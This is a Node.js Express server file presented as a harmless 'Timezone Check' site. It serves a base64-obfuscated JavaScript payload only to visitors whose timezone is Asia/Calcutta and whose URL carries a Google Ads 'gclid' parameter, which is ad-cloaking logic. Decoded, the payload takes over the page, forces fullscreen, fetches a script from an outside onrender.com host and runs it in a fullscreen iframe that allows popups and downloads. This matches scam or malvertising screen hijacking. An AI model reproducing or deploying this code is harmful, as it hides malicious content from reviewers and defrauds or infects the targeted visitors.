const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import cors

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Enable CORS and restrict it to http://localhost:3000
app.use(cors());
// Serve the HTML file
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Timezone Check</title>
    </head>
    <body>
        <h1>Welcome to Website B</h1>
        <p>This server checks the timezone and URL parameters.</p>
    </body>
    </html>
    `);
});

// Endpoint to receive data from website A
app.post('/api/timezone', (req, res) => {
    const { timezone, fullUrl } = req.body;

    // Check if the request body is valid
    if (!req.body || !timezone || !fullUrl) {
        return res.status(400).send('Invalid request body.');
    }

    console.log(`Received timezone: ${timezone}, fullUrl: ${fullUrl}`);

    // Check if the timezone is Asia/Calcutta
    const isTimezoneJapan = timezone === 'Asia/Calcutta';

    // Check if the URL contains 'gclid'
    const containsGclid = fullUrl.includes('gclid');

    // Base64 code to send in response
    const base64Code = 'Ly8gSGlkZSBvdmVyZmxvdyBvbiB0aGUgZG9jdW1lbnQgZWxlbWVudA0KZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnN0eWxlLm92ZXJmbG93ID0gImhpZGRlbiI7DQoNCi8vIEluc2VydCBhbiBIVE1MIGRpdiB3aXRoIHNwZWNpZmljIHN0eWxlcyBpbnRvIHRoZSBkb2N1bWVudCBib2R5DQpkb2N1bWVudC5ib2R5Lmluc2VydEFkamFjZW50SFRNTCgiYWZ0ZXJiZWdpbiIsICc8ZGl2IGlkPSJicnVjZURpdiIgc3R5bGU9InotaW5kZXg6IDk5OTk7IHBvaW50ZXItZXZlbnRzOiBhdXRvOyBvdmVyZmxvdzogaGlkZGVuOyI+PC9kaXY+Jyk7DQoNCi8vIEFkZCBhIGNsaWNrIGV2ZW50IGxpc3RlbmVyIHRvIHRyaWdnZXIgZnVsbHNjcmVlbiBhbmQgZmV0Y2ggZXh0ZXJuYWwgY29udGVudA0KZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigid2ViZmlyc3RsaW5lIiwgZnVuY3Rpb24oKSB7DQogICAgd2luZG93LnNjcm9sbFRvKDAsIDApOw0KICAgIHNldFRpbWVvdXQoKCkgPT4gew0KICAgICAgICBpZiAoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnJlcXVlc3RGdWxsc2NyZWVuKSB7DQogICAgICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQucmVxdWVzdEZ1bGxzY3JlZW4oKTsNCiAgICAgICAgfSBlbHNlIGlmIChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQubW96UmVxdWVzdEZ1bGxTY3JlZW4pIHsNCiAgICAgICAgICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tb3pSZXF1ZXN0RnVsbFNjcmVlbigpOw0KICAgICAgICB9IGVsc2UgaWYgKGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC53ZWJraXRSZXF1ZXN0RnVsbHNjcmVlbikgew0KICAgICAgICAgICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LndlYmtpdFJlcXVlc3RGdWxsc2NyZWVuKCk7DQogICAgICAgIH0gZWxzZSBpZiAoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm1zUmVxdWVzdEZ1bGxzY3JlZW4pIHsNCiAgICAgICAgICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5tc1JlcXVlc3RGdWxsc2NyZWVuKCk7DQogICAgICAgIH0NCiAgICB9LCAxMDApOw0KDQogICAgLy8gRmV0Y2ggSlMgY29udGVudCBmcm9tIHRoZSBuZXcgVVJMIGFuZCBlbWJlZCBpdCBpbiBhbiBpZnJhbWUNCiAgICBmZXRjaCgiaHR0cHM6Ly90d28yZy1jeGQ5Lm9ucmVuZGVyLmNvbS9pbmRleC5qcyIpDQogICAgICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkNCiAgICAgICAgLnRoZW4oY29udGVudCA9PiB7DQogICAgICAgICAgICBsZXQgYmxvYiA9IG5ldyBCbG9iKFtjb250ZW50XSwgeyB0eXBlOiAiYXBwbGljYXRpb24vamF2YXNjcmlwdCIgfSk7DQogICAgICAgICAgICBsZXQgdXJsID0gVVJMLmNyZWF0ZU9iamVjdFVSTChiTG9iKTsNCiAgICAgICAgICAgIGxldCBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpZnJhbWUiKTsNCiAgICAgICAgICAgIGlmcmFtZS5zcmMgPSB1cmw7DQogICAgICAgICAgICBpZnJhbWUuc3R5bGUud2lkdGggPSAiMTAwJSI7DQogICAgICAgICAgICBpZnJhbWUuc3R5bGUuaGVpZ2h0ID0gIjEwMCUiOw0KICAgICAgICAgICAgaWZyYW1lLmZyYW1lQm9yZGVyID0gIjAiOw0KICAgICAgICAgICAgaWZyYW1lLnNldEF0dHJpYnV0ZSgiYWxsb3dmdWxsc2NyZWVuIiwgIiIpOw0KICAgICAgICAgICAgaWZyYW1lLnNldEF0dHJpYnV0ZSgid2Via2l0YWxsb3dmdWxsc2NyZWVuIiwgIiIpOw0KICAgICAgICAgICAgaWZyYW1lLnNldEF0dHJpYnV0ZSgibW96YWxsb3dmdWxsc2NyZWVuIiwgIiIpOw0KICAgICAgICAgICAgaWZyYW1lLnNhbmRib3ggPSAiYWxsb3ctc2NyaXB0cyBhbGxvdy1wb3B1cHMgYWxsb3ctZG93bmxvYWRzIjsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJicnVjZURpdiIpLmFwcGVuZENoaWxkKGlmcmFtZSk7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiYnJ1Y2VEaXYiKS5zdHlsZS5oZWlnaHQgPSAiMTAwdmgiOw0KICAgICAgICB9KQ0KICAgICAgICAuY2F0Y2goZXJyb3IgPT4gew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcigiRXJyb3IgZmV0Y2hpbmcgdGhlIEphdmFTY3JpcHQ6IiwgZXJyb3IpOw0KICAgICAgICB9KTsNfSwgeyBvbmNlOiB0cnVlIH0pOw0K'; // Your base64 string here

    // If both conditions are met, respond with the base64 code
    if (isTimezoneJapan && containsGclid) {
        console.log(`Response sent: ${base64Code}`);
        return res.status(200).send(base64Code); // Send the base64 string directly
    } else {
        const responseMessage = 'Conditions not met.';
        console.log(responseMessage);
        return res.status(200).send(responseMessage);
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
